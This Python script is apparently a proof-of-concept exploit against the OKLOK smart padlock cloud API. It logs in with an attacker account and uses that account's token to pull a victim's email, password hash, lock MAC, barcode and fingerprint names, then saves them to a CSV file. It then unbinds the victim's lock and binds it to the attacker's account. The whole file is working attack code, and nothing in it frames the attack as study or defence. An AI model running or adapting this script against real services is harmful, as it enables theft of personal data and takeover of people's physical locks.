#!/usr/bin/env python3

import requests
import json
import sys
import datetime
import getpass
import csv


def login_attacker(attacker_email_address, attacker_password):
		
	login_url = 'https://app.oklok.com.cn/oklock/user/loginByPassword'

	body = {"code":attacker_password,"account":attacker_email_address,"type":"0"}

	login_headers = {'Host': 'app.oklok.com.cn',
	'Content-Type': 'application/json',
	'Connection': 'keep-alive',
	'Accept': '*/*',
	'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
	'Accept-Language': 'en-US;q=1',
	'Content-Length': '70',
	'Accept-Encoding': 'gzip, deflate, br'}

	print('\n-------------------------------------------------------------')
	print('Logging in...')

	
	response = requests.post(login_url, data=json.dumps(body), headers=login_headers)
	json_resp = response.json()
	status = json_resp['status']
	if status == '2000':
		print('Login successful!\n')
		print('Login Details:')
		result = json_resp['result']
		attacker_token = result['token']
		attacker_userID = result['userId']
		print('attacker_token: ' + str(attacker_token))
		print('attacker_userId: ' + str(attacker_userID))
		print('-------------------------------------------------------------\n')
		return attacker_token, attacker_userID

	else:
		sys.exit('Login not successful.')

def scan_id(victim_userID, attacker_token, attacker_userID, headers):

	get_user_info = 'https://app.oklok.com.cn/oklock/user/getInfo'

	get_lock_info = 'https://app.oklok.com.cn/oklock/lock/getLockList'

	get_fingerprints_info = 'https://app.oklok.com.cn/oklock/lock/fingerprintList'         

	print('-------------------------------------------------------------\n')
	print('userId: ' + str(victim_userID))
	body = {"userId":victim_userID}

	user_info = requests.post(get_user_info, data=json.dumps(body), headers=headers)
	lock_info = requests.post(get_lock_info, data=json.dumps(body), headers=headers)

	json_user_info = user_info.json()
	json_lock_info = lock_info.json()

	user_result = json_user_info['result']
	user_status = json_user_info['status']

	lock_result = json_lock_info['result']
	lock_status = json_lock_info['status']
	if user_status == '2000':
		if len(user_result)!=0:
			acct_creation = user_result['createAt']
			cid = user_result['cid']
			nickname = user_result['nickName']
			email_address = user_result['userId']
			password_hash = user_result['password']
			qrUrl = user_result['qrUrl']
			picUrl = user_result['picUrl']
			print('account creation: ' + str(acct_creation))
			print('cid: ' + str(cid))
			print('nickname: ' + str(nickname))
			print('email address: ' + str(email_address))
			print('password hash: ' + str(password_hash))
			print('qrUrl: ' + str(qrUrl))
			print('picUrl: ' + str(picUrl))
		else:
			print('No user results found')
			print('-------------------------------------------------------------\n')
	else:
		print('HTTP Error - Could not retrieve user info.')

	if lock_status == '2000':
		if len(lock_result)!=0:
			name = lock_result[0]['name']
			mac = lock_result[0]['mac']
			barcode = lock_result[0]['barcode']
			lockId = lock_result[0]['id']

			body_fingerprints = {"userId":victim_userID, "lockId":lockId}
			fingerprints_info = requests.post(get_fingerprints_info, data=json.dumps(body_fingerprints), headers=headers)
			json_prints_info = fingerprints_info.json()
			prints_result = json_prints_info['result']
			prints_status = json_prints_info['status']
			if prints_status == '2000':
				if len(prints_result)!=0:
					prints_name = prints_result[0]['name']
				else:
					prints_name = 'N/A'
			print('lock name: ' + str(name))
			print('mac address: ' + str(mac))
			print('barcode: ' + str(barcode))
			print('lockId: ' + str(lockId))
			print('registered prints: ' + str(prints_name))

		else:
			name = 'N/A'
			print('lock name: N/A')
			print('mac address: N/A')
			print('barcode: N/A')
			print('lockId: N/A')
			print('registered prints: N/A')
	else:
		print('HTTP Error - Could not retrieve lock info')
	print('-------------------------------------------------------------\n')

	if name != 'N/A':
		with open('userdata.csv', 'a') as f:
			writer = csv.writer(f)
			writer.writerow([email_address,name,prints_name,barcode])

		unbind(victim_userID, lockId, attacker_token, barcode, headers)

		bind(attacker_userID, mac, name, attacker_token, barcode, headers)

	else:
		print('\nNo lock bound to account.\n')
		with open('userdata.csv', 'a') as f:
			writer = csv.writer(f)
			writer.writerow([email_address,'N/A','N/A','N/A'])



def unbind(victim_userID, lockId, attacker_token, barcode, headers):
	url = 'https://app.oklok.com.cn/oklock/lock/unbind'
	body = {"userId":victim_userID,"lockId":lockId}

	print('Unbinding {barcode} from victim...'.format(barcode=barcode))

	response = requests.post(url, data=json.dumps(body), headers=headers)
	json_resp = response.json()
	status = json_resp['status']
	if status == '2000':
		print('Success!')
	else:
		sys.exit('Unbind failure.')
	print('-------------------------------------------------------------\n')



def bind(attacker_userID, mac, name, attacker_token, barcode, headers):
	url = 'https://app.oklok.com.cn/oklock/lock/bind'
	body = {"isLock":"1","userId": attacker_userID,"mac":mac,"name":name}

	print('Binding {barcode} to attacker...'.format(barcode=barcode))

	response = requests.post(url, data=json.dumps(body), headers=headers)
	json_resp = response.json()
	status = json_resp['status']
	if status == '2000':
		print('Success!')
	else:
		sys.exit('Bind failure.')
	print('-------------------------------------------------------------\n')


def main():

	start_time = datetime.datetime.now()

	if len(sys.argv) is not 3:
		sys.exit('Usage: python3 attack_scenario_remote.py <victim_userID> <attacker_email_address>')
	else:
		victim_userID = sys.argv[1]
		attacker_email_address = sys.argv[2]
		attacker_password = getpass.getpass('Attacker Password: ')

	with open('userdata.csv', 'w') as f:
			writer = csv.writer(f)
			writer.writerow(['email','lock_name','fingerprint_name','barcode']) 

	attacker_token_userID = login_attacker(attacker_email_address, attacker_password)

	attacker_token = attacker_token_userID[0]

	attacker_userID = attacker_token_userID[1]

	headers = {'Host': 'app.oklok.com.cn',
    'phoneModel': 'iPhone11,8',
    'Accept': '*/*',
    'appVersion': '3.1.1',
    'Accept-Language': 'en-US;q=1',
    'Accept-Encoding': 'gzip, deflate, br',
    'token': attacker_token,
    'Content-Type': 'application/json',
    'clientType': 'iOS',
    'language': 'en-US',
    'User-Agent': 'OKLOK/3.1.1 (iPhone; iOS 13.3; Scale/2.00)',
    'Connection': 'keep-alive',
    'osVersion': '13.3'}

	scan_id(victim_userID, attacker_token, attacker_userID, headers)

	total_time = datetime.datetime.now() - start_time

	print('Total Execution Time: ' + str(total_time))
	print('-------------------------------------------------------------\n')


if __name__ == '__main__':
	main()